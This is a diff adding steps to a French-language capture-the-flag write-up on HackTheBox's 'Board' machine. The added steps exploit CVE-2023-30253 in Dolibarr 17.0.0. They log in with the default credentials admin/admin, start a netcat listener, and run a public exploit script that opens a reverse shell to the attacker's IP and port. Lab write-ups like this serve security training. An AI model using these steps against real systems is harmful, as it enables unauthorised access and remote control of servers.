@@ -146,3 +146,14 @@ https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
 https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253
 ```
 À court d'idée, on tente de se logger avec des credentials par défaut qui sont populaire. On fini par trouver `admin`  `admin` comme login.
+
+Maintenant qu'on a les credentials, ont peut exécuter le CVE pour obtenir un reverse shell.
+Pour se faire, on démarre d'abord netcat:
+```bash
+nc -lvnp 9001
+```
+
+Puis, on lance le script:
+```bash
+python3 exploit.py http://crm.board.htb/ admin admin 10.10.14.252 9001
+```
